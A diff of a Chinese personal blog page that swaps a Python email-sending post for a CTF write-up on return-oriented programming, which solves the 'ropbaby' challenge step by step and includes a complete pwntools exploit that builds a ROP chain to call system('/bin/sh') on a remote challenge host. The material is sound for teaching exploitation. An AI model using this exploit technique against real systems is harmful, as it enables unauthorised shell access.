@@ -6,20 +6,35 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://igk-dls.github.io">
-  <title>Python 邮件编程 | 怪咖的小屋</title>
+  <title>ROP (Return-oriented programming ) 返回导向编程 | 怪咖的小屋</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Python 邮件编程应用python来实现邮件发送，在暑假期间玩了一下这个也是很爽的。qq没有把它们当作垃圾邮件，163…呵呵">
-<meta name="keywords" content="python">
+  <meta name="description" content="ROP (Return-oriented programming ) 返回导向编程ROP(Return Oriented Programming)即面向返回地址编程，其主要思想是在栈缓冲区溢出的基础上，通过利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而改变程序的执行流程，达到预期利用目的。">
+<meta name="keywords" content="pwn,ROP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Python 邮件编程">
-<meta property="og:url" content="http://igk-dls.github.io/2019/09/10/Python 邮件编程/index.html">
+<meta property="og:title" content="ROP (Return-oriented programming ) 返回导向编程">
+<meta property="og:url" content="http://igk-dls.github.io/2019/09/10/ROP(Return-oriented-programming)返回导向编程/index.html">
 <meta property="og:site_name" content="怪咖的小屋">
-<meta property="og:description" content="Python 邮件编程应用python来实现邮件发送，在暑假期间玩了一下这个也是很爽的。qq没有把它们当作垃圾邮件，163…呵呵">
+<meta property="og:description" content="ROP (Return-oriented programming ) 返回导向编程ROP(Return Oriented Programming)即面向返回地址编程，其主要思想是在栈缓冲区溢出的基础上，通过利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而改变程序的执行流程，达到预期利用目的。">
 <meta property="og:locale" content="zh">
-<meta property="og:updated_time" content="2019-09-12T10:39:44.386Z">
+<meta property="og:image" content="http://igk-dls.github.io/2019/09/10/ROP(Return-oriented-programming)返回导向编程/d514bf7df4e170521042293fdc69e3d7.png">
+<meta property="og:image" content="http://igk-dls.github.io/2019/09/10/ROP(Return-oriented-programming)返回导向编程/79671673cb3dbdc18b17630713a6fa10.png">
+<meta property="og:image" content="http://igk-dls.github.io/2019/09/10/ROP(Return-oriented-programming)返回导向编程/ee6566df7256098be4ab03686b8a9c8a.png">
+<meta property="og:image" content="http://igk-dls.github.io/2019/09/10/ROP(Return-oriented-programming)返回导向编程/bc4a38b47b5fb2858aa7c89ae1d80697.png">
+<meta property="og:image" content="http://igk-dls.github.io/2019/09/10/ROP(Return-oriented-programming)返回导向编程/c8dbb3b018a921c371b140115253b52f.png">
+<meta property="og:image" content="http://igk-dls.github.io/2019/09/10/ROP(Return-oriented-programming)返回导向编程/09c4d08f7fb7e50ef331935c777cf403.png">
+<meta property="og:image" content="http://igk-dls.github.io/2019/09/10/ROP(Return-oriented-programming)返回导向编程/d9ce806250e3ab925ac3fbba9336c63a.png">
+<meta property="og:image" content="http://igk-dls.github.io/2019/09/10/ROP(Return-oriented-programming)返回导向编程/2f1da7027901200e157d3edb9908815f.png">
+<meta property="og:image" content="http://igk-dls.github.io/2019/09/10/ROP(Return-oriented-programming)返回导向编程/5a73527385c79cd9bcbd0bc832ebaa92.png">
+<meta property="og:image" content="http://igk-dls.github.io/2019/09/10/ROP(Return-oriented-programming)返回导向编程/b476dafead58d72a02f5a03b4ad48d63.png">
+<meta property="og:image" content="http://igk-dls.github.io/2019/09/10/ROP(Return-oriented-programming)返回导向编程/d7c675fffc61a43ce0238648eb20d885.png">
+<meta property="og:image" content="http://igk-dls.github.io/2019/09/10/ROP(Return-oriented-programming)返回导向编程/cdc3b8cb24f2db99e422c98cba4c2cd4.png">
+<meta property="og:image" content="http://igk-dls.github.io/2019/09/10/ROP(Return-oriented-programming)返回导向编程/638d973dde12d491bf623f5a33a56383.png">
+<meta property="og:image" content="http://igk-dls.github.io/2019/09/10/ROP(Return-oriented-programming)返回导向编程/af92467f178d1d29a856801aace8c2ef.png">
+<meta property="og:updated_time" content="2019-09-12T10:52:05.660Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Python 邮件编程">
-<meta name="twitter:description" content="Python 邮件编程应用python来实现邮件发送，在暑假期间玩了一下这个也是很爽的。qq没有把它们当作垃圾邮件，163…呵呵">
+<meta name="twitter:title" content="ROP (Return-oriented programming ) 返回导向编程">
+<meta name="twitter:description" content="ROP (Return-oriented programming ) 返回导向编程ROP(Return Oriented Programming)即面向返回地址编程，其主要思想是在栈缓冲区溢出的基础上，通过利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而改变程序的执行流程，达到预期利用目的。">
+<meta name="twitter:image" content="http://igk-dls.github.io/2019/09/10/ROP(Return-oriented-programming)返回导向编程/d514bf7df4e170521042293fdc69e3d7.png">
   
     <link rel="alternative" href="/atom.xml" title="怪咖的小屋" type="application/atom+xml">
   
@@ -149,20 +164,20 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Python 邮件编程" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-ROP(Return-oriented-programming)返回导向编程" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Python 邮件编程
+      ROP (Return-oriented programming ) 返回导向编程
     </h1>
   
 
         
                 <!-- 不蒜子统计 -->        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次        </span>
-<a href="/2019/09/10/Python 邮件编程/" class="archive-article-date">
+<a href="/2019/09/10/ROP(Return-oriented-programming)返回导向编程/" class="archive-article-date">
   	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
 </a>
         
@@ -170,11 +185,17 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="Python-邮件编程"><a href="#Python-邮件编程" class="headerlink" title="Python 邮件编程"></a>Python 邮件编程</h3><p>应用python来实现邮件发送，在暑假期间玩了一下这个也是很爽的。qq没有把它们当作垃圾邮件，163…呵呵<a id="more"></a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span>  smtplib</span><br><span class="line"><span class="keyword">from</span>  email.mime.text  <span class="keyword">import</span>  MIMEText</span><br><span class="line"><span class="keyword">from</span>  email.header  <span class="keyword">import</span>  Header</span><br><span class="line"><span class="keyword">from</span>  email.mime.multipart  <span class="keyword">import</span>  MIMEMultipart</span><br><span class="line"></span><br><span class="line"><span class="comment"># 邮件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># smtp服务器</span></span><br><span class="line"></span><br><span class="line">host  =  <span class="string">"smtp.qq.com"</span></span><br><span class="line">sender  =  <span class="string">"xxxxxxx@qq.com"</span></span><br><span class="line"></span><br><span class="line">receivers  = [<span class="string">"xxxxxxx@qq.com"</span>,<span class="string">"xxxxxxx@qq.com"</span>,<span class="string">"xxxxxxx@qq.com"</span>,<span class="string">"xxxxxxx@qq.com"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密码，非邮箱密码</span></span><br><span class="line"></span><br><span class="line">password  =  <span class="string">"xxxxxxxxxxxxxxxx"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 带附件的邮件实例</span></span><br><span class="line"></span><br><span class="line">message  =  MIMEMultipart()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不带附件的邮件实例</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># message = MIMEText(msg,'html','utf-8')</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#msg = """</span></span><br><span class="line"><span class="comment">#&lt;p&gt;电子邮件内容&lt;/p&gt;</span></span><br><span class="line"><span class="comment">#&lt;p&gt;&lt;a href="[http://www.baidu.com](http://www.baidu.com/)"&gt;百度搜索&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment">#"""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 另一种写法</span></span><br><span class="line"></span><br><span class="line">message.attach(MIMEText(<span class="string">'&lt;p&gt;电子邮件内容&lt;/p&gt;&lt;p&gt;&lt;a href="[http://www.baidu.com](http://www.baidu.com/)"&gt;百度搜索&lt;/a&gt;&lt;/p&gt;'</span>,<span class="string">'html'</span>,<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># message.attach(MIMEText('&lt;p&gt;电子邮件内容&lt;/p&gt;&lt;p&gt;&lt;a href="[http://www.baidu.com](http://www.baidu.com/)"&gt;百度搜索&lt;/a&gt;&lt;/p&gt;','plain','utf-8'))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 两个附件</span></span><br><span class="line"></span><br><span class="line">attr1  =  MIMEText(open(<span class="string">'1.jpg'</span>,<span class="string">'rb'</span>).read(),<span class="string">'base64'</span>,<span class="string">'utf-8'</span>)</span><br><span class="line">attr1[<span class="string">"Content-Type"</span>] =  <span class="string">"application/octet-stream"</span></span><br><span class="line">attr1[<span class="string">"Content-Disposition"</span>] =  <span class="string">"attachment; filename='1.jpg'"</span></span><br><span class="line"></span><br><span class="line">attr2  =  MIMEText(open(<span class="string">'2.jpg'</span>,<span class="string">'rb'</span>).read(),<span class="string">'base64'</span>,<span class="string">'utf-8'</span>)</span><br><span class="line">attr2[<span class="string">"Content-Type"</span>] =  <span class="string">"application/octet-stream"</span></span><br><span class="line">attr2[<span class="string">"Content-Disposition"</span>] =  <span class="string">"attachment; filename='2.jpg'"</span></span><br><span class="line"></span><br><span class="line">message[<span class="string">'From'</span>] =  Header(<span class="string">"测试"</span>,<span class="string">'utf-8'</span>)</span><br><span class="line">message[<span class="string">'To'</span>] =  Header(<span class="string">"测试"</span>,<span class="string">"utf-8"</span>)</span><br><span class="line">message.attach(attr1)</span><br><span class="line">message.attach(attr2)</span><br><span class="line"></span><br><span class="line">subject  =  <span class="string">'测试'</span></span><br><span class="line">message[<span class="string">'Subject'</span>] =  Header(subject,<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 465为下述图片中smtp服务器使用SSL的端口号，587不对</span></span><br><span class="line">    smtpObj  =  smtplib.SMTP_SSL(host,<span class="number">465</span>)</span><br><span class="line">    smtpObj.login(sender,password)</span><br><span class="line">    smtpObj.sendmail(sender,receivers,message.as_string())</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'发送成功'</span></span><br><span class="line"><span class="keyword">except</span>  Exception  <span class="keyword">as</span>  e:</span><br><span class="line">    <span class="keyword">print</span>  e</span><br></pre></td></tr></table></figure>
+        <h3 id="ROP-Return-oriented-programming-返回导向编程"><a href="#ROP-Return-oriented-programming-返回导向编程" class="headerlink" title="ROP (Return-oriented programming ) 返回导向编程"></a>ROP (Return-oriented programming ) 返回导向编程</h3><p><code>ROP(Return Oriented Programming)</code>即面向返回地址编程，其主要思想是在栈缓冲区溢出的基础上，通过利用程序中<strong>已有的小片段(gadgets)</strong>来改变某些寄存器或者变量的值，从而改变程序的执行流程，达到预期利用目的。<a id="more"></a></p>
+<p>以<strong>实验吧 ropbaby</strong>为例：<br><img src="/2019/09/10/ROP(Return-oriented-programming)返回导向编程/d514bf7df4e170521042293fdc69e3d7.png" alt><br>简单的栈溢出利用，NX开了，那么就要用ROP了；开了PIE，就要想办法泄露出libc的基址，但这道题比较友好。<br><img src="/2019/09/10/ROP(Return-oriented-programming)返回导向编程/79671673cb3dbdc18b17630713a6fa10.png" alt></p>
+<p>那么<strong>利用思路</strong>就很简单了：寻找可以利用的ret，将栈布局为：无效字段*offset+p64(addr_ret)+p64(‘/bin/sh’)+p64(‘addr_system’)</p>
+<p>在memcpy完想要ret时，会ret到addr_ret的地址，然后将’/bin/sh’pop出来当作参数，在下一个ret时，ret到addr_system这里，因为已经布局好了其参数’/bin/sh’，所以相当于执行system(‘/bin/sh’)，拿到shell.</p>
+<p>首先<strong>寻找溢出点</strong>：<br><img src="/2019/09/10/ROP(Return-oriented-programming)返回导向编程/ee6566df7256098be4ab03686b8a9c8a.png" alt><br>经过验证,将nptr复制给savedregs时会发生溢出。<br>接着<strong>查找可控字段，计算偏移量</strong>。<br><img src="/2019/09/10/ROP(Return-oriented-programming)返回导向编程/bc4a38b47b5fb2858aa7c89ae1d80697.png" alt><br><img src="/2019/09/10/ROP(Return-oriented-programming)返回导向编程/c8dbb3b018a921c371b140115253b52f.png" alt><br><img src="/2019/09/10/ROP(Return-oriented-programming)返回导向编程/09c4d08f7fb7e50ef331935c777cf403.png" alt><br>偏移量为8<br>验证如下：<br><img src="/2019/09/10/ROP(Return-oriented-programming)返回导向编程/d9ce806250e3ab925ac3fbba9336c63a.png" alt><br><img src="/2019/09/10/ROP(Return-oriented-programming)返回导向编程/2f1da7027901200e157d3edb9908815f.png" alt><br><strong>寻找libc中’/bin/sh’的偏移量</strong>(在32位机器上可以找到，我也不知道为什么64位不行)<br><img src="/2019/09/10/ROP(Return-oriented-programming)返回导向编程/5a73527385c79cd9bcbd0bc832ebaa92.png" alt><br>offset_binsh = 0x18cd17<br>接着需要<strong>查找所有的 ret</strong>，使用ROPgadget(32位可以，64不知道为什么不行)<br><img src="/2019/09/10/ROP(Return-oriented-programming)返回导向编程/b476dafead58d72a02f5a03b4ad48d63.png" alt><br><img src="/2019/09/10/ROP(Return-oriented-programming)返回导向编程/d7c675fffc61a43ce0238648eb20d885.png" alt></p>
+<p><strong>注意：</strong>64位参数先以寄存器为主，分别是rdi,rsi,rdx,rcx,r8,r9,栈；32位只有栈。该程序是64位，之后的system(‘/bin/sh’)只有一个参数，入rdi寄存器，所以找相应的指令:pop rdi;ret;</p>
+<p><img src="/2019/09/10/ROP(Return-oriented-programming)返回导向编程/cdc3b8cb24f2db99e422c98cba4c2cd4.png" alt><br>那么offset_rdi_ret = 0x21102<br><strong>拿到offset_system</strong><br><img src="/2019/09/10/ROP(Return-oriented-programming)返回导向编程/638d973dde12d491bf623f5a33a56383.png" alt><br>利用2可以拿到addr_system，然后addr_libc就可以计算出来了。</p>
+<p><strong>exp如下：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn  <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    s  =  remote(<span class="string">"106.2.25.7"</span>,  <span class="number">8004</span>)</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] Start!'</span></span><br><span class="line">    s.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    <span class="comment">#Get addr_system</span></span><br><span class="line">    s.sendline(<span class="string">'2'</span>)</span><br><span class="line">    s.recvuntil(<span class="string">'Enter symbol: '</span>)</span><br><span class="line">    s.sendline(<span class="string">'system'</span>)</span><br><span class="line">    addr_system  =  int  (s.recvuntil(<span class="string">'\n'</span>)[<span class="number">14</span>:],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] addr_system is '</span>,addr_system</span><br><span class="line">    offset_system  =  <span class="number">0x45390</span></span><br><span class="line">    <span class="comment">#Calculate addr_libc</span></span><br><span class="line">    addr_libc  =  addr_system  -  offset_system</span><br><span class="line">    <span class="comment">#Make payload</span></span><br><span class="line">    s.sendline(<span class="string">'3'</span>)</span><br><span class="line">    s.recvuntil(<span class="string">'(max 1024): '</span>)</span><br><span class="line">    <span class="comment">#8 + 8 + 8 + 8 =32</span></span><br><span class="line">    s.sendline(<span class="string">'32'</span>)</span><br><span class="line">    offset_binsh  =  <span class="number">0x18cd17</span></span><br><span class="line">    offset_rdi_ret  =  <span class="number">0x21102</span></span><br><span class="line">    addr_rdi_ret  =  addr_libc  +  offset_rdi_ret</span><br><span class="line">    addr_binsh  =  addr_libc  +  offset_binsh</span><br><span class="line"></span><br><span class="line">    payload  =<span class="string">'A'</span>  *  <span class="number">8</span>  +  p64(addr_rdi_ret)  +  p64(addr_binsh)  +  p64(addr_system)</span><br><span class="line"></span><br><span class="line">    s.sendline(payload)</span><br><span class="line">    s.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  __name__  ==  <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 
-<p>![](Python 邮件编程/c49ccdee083d384653faa8cdec824f61.png)<br>![](Python 邮件编程/d6e62c7ca1858b27e077ea617a621e54.png)</p>
-<p>测试结果如下：<br>![](Python 邮件编程/e5b834ba43103962b14a41c0b4d79bc3.png)</p>
+<p><strong>运行结果如下：</strong><br><img src="/2019/09/10/ROP(Return-oriented-programming)返回导向编程/af92467f178d1d29a856801aace8c2ef.png" alt="1534153380698.png"></p>
 
       
 	  
@@ -186,7 +207,7 @@
                 
                 <br>
                 <strong>本文链接：</strong>
-                http://igk-dls.github.io/2019/09/10/Python 邮件编程/
+                http://igk-dls.github.io/2019/09/10/ROP(Return-oriented-programming)返回导向编程/
                 <br>
                 <strong>版权声明：</strong>
                 本作品采用
@@ -235,7 +256,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ROP</a>
         		</li>
       		
 		</ul>
@@ -291,7 +316,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://igk-dls.github.io/2019/09/10/Python 邮件编程/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://igk-dls.github.io/2019/09/10/ROP(Return-oriented-programming)返回导向编程/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -305,18 +330,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/09/10/Python z3-solver/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2019/09/10/Python-邮件编程/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          Python z3-solver
+          Python 邮件编程
         
       </div>
     </a>
   
   
-    <a href="/2019/09/10/PythonHash/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">PythonHash</div>
+    <a href="/2019/09/10/ROP之ret2dlresolve/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ROP之ret2dlresolve</div>
       <i class="icon-circle-right"></i>
     </a>
   
